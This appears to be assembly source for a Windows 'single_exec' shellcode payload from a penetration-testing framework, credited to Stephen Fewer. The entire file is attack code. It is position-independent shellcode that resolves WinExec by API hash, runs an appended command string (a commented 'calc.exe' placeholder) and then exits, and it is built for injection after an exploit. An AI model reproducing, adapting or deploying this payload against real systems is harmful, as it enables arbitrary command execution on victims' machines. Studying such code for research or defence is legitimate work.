;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (28 July 2009)
; Size: 191 bytes + strlen(command) + 1
; Build: >build.py single_exec
;-----------------------------------------------------------------------------;

[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "./src/block/block_api.asm" ; 
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
  push byte +1           ;
  lea eax, [ebp+command-delta]
  push eax               ;
  push 0x876F8B31        ; hash( "kernel32.dll", "WinExec" )
  call ebp               ; WinExec( &command, 1 );
	; Finish up with the EXITFUNK.
%include "./src/block/block_exitfunk.asm"
command:
  ;db "calc.exe", 0